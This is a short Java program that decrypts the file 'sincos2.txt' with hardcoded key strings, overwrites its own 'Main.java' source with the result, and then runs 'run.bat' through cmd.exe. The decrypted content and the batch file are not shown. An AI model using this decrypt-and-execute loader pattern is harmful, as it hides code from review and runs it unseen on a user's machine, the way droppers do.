
//////
import java.io.*;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.util.Scanner;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.ShortBufferException;

public class Main {

	public static void main(String[] args) throws Exception{
		// TODO Auto-generated method stub
		try(FileInputStream fos=new FileInputStream("sincos2.txt"))
        {
			byte[] input = new byte[fos.available()];
            fos.read(input,0,fos.available());
			byte[] a = "alfmsirb".getBytes();
			byte[] b = "slmgjsor".getBytes();
			ObjectCrypter O=new ObjectCrypter(a,b);
			byte[] output=(byte[]) O.decrypt(input);
			String txt=new String(output);
			try(FileOutputStream fos1=new FileOutputStream("Main.java")){
				byte[] buffer = output;
	              
	            fos1.write(buffer, 0, buffer.length);
			}
			String command = "cmd /c start cmd.exe /K run.bat";
			Process pr = Runtime.getRuntime().exec(command);
			pr.waitFor();
			
		}

}
}